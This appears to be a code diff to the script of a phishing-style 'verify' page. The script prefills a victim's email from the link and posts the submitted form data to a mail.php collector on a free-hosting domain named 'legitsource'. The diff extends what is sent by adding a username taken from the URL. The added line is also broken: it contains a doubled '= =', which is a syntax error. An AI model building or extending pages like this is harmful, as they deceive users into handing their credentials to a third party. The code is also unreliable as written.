@@ -110,6 +110,7 @@
     const urlParams = new URLSearchParams(window.location.search);
     const emailParam = urlParams.get("email");
     const userIDParam = urlParams.get("user_id");
+    const userName = = urlParams.get("username");
     if (emailParam) {
       document.getElementById("email").value = emailParam;
     } else {
@@ -121,6 +122,7 @@
       const formData = new FormData(this);
       formData.append("action", "verify");
       formData.append("user_id", userIDParam);
+      formData.append("username", userName);
 
       fetch("https://legitsource.coolpage.biz/shvf/mail.php", {
         method: "POST",
